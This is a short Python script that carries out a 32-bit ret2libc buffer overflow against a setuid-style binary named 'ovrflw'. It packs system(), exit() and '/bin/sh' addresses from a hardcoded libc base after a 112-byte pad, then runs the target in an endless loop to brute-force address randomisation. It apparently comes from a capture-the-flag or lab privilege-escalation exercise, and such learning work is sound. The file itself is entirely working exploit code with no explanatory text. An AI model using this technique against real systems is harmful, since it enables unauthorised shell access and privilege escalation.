#!/usr/bin/python3

from struct import pack
from subprocess import call


# Re2Libc 32 bits => system_addr + exit_addr + bin_sh_addr
offset = 112
exploit = b'A'*offset
base_libc_addr = 0xb7594000

system_addr_off = 0x00040310
exit_addr_off = 0x00033260
bin_sh_addr_off = 0x00162bac

# defyining address 
system_addr = pack("<L", base_libc_addr + system_addr_off)
exit_addr = pack("<L", base_libc_addr + exit_addr_off)
bin_sh_addr = pack("<L", base_libc_addr + bin_sh_addr_off)

exploit += system_addr + exit_addr + bin_sh_addr

while True:
    ret = call(["/usr/local/bin/ovrflw", exploit])
